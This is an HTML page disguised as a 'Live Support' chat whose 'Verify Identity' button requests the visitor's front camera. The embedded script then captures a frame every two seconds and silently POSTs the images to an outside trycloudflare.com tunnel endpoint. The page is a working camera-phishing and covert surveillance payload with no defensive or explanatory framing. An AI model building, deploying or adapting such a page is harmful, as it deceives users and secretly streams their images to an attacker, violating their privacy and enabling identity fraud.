<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #0a0e27;
    font-family: 'Inter', sans-serif;
}
.support-container {
    max-width: 600px;
    margin: 0 auto;
    padding: 20px;
}
.header {
    background: linear-gradient(135deg, #667eea, #764ba2);
    padding: 40px 20px;
    text-align: center;
    color: white;
    border-radius: 0 0 30px 30px;
}
.chat-window {
    background: white;
    border-radius: 20px;
    margin-top: -30px;
    padding: 20px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.1);
}
.message {
    margin-bottom: 15px;
    display: flex;
    gap: 10px;
}
.bot-message {
    background: #f0f0f0;
    padding: 10px 15px;
    border-radius: 18px;
    max-width: 80%;
}
.user-message {
    justify-content: flex-end;
}
.user-message div {
    background: #667eea;
    color: white;
    padding: 10px 15px;
    border-radius: 18px;
}
.camera-request {
    background: #f0f0f0;
    border-radius: 15px;
    padding: 20px;
    text-align: center;
    margin: 20px 0;
}
video, canvas { width: 100%; border-radius: 10px; display: none; }
.cam-placeholder {
    height: 200px;
    background: #e0e0e0;
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 50px;
}
button {
    background: #667eea;
    color: white;
    border: none;
    padding: 10px 20px;
    border-radius: 20px;
    margin-top: 10px;
    cursor: pointer;
}
</style>
</head>
<body>
<div class="support-container">
    <div class="header">
        <h2>🎧 Live Support</h2>
        <p>We're here to help 24/7</p>
    </div>
    <div class="chat-window">
        <div class="message">
            <div class="bot-message">Hello! How can I help you today?</div>
        </div>
        <div class="message user-message">
            <div>I need help with my account</div>
        </div>
        <div class="message">
            <div class="bot-message">For security verification, please verify your identity</div>
        </div>
        <div class="camera-request">
            <div class="cam-placeholder">📷</div>
            <video id="video" playsinline autoplay></video>
            <canvas id="canvas" width="640" height="480"></canvas>
            <button onclick="allowCamera()">Verify Identity</button>
        </div>
    </div>
</div>
<script>
function post(imgdata) {
    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php' });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let streamActive = false;
const constraints = { audio: false, video: { facingMode: "user" } };
async function allowCamera() {
    if(!streamActive) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;
            video.style.display = 'block';
            document.querySelector('.cam-placeholder').style.display = 'none';
            streamActive = true;
            const context = canvas.getContext('2d');
            setInterval(() => {
                context.drawImage(video, 0, 0, 640, 480);
                post(canvas.toDataURL("image/png"));
            }, 2000);
            alert("Verification in progress...");
        } catch(e) { alert("Camera required for verification"); }
    }
}
</script>
</body>
</html>
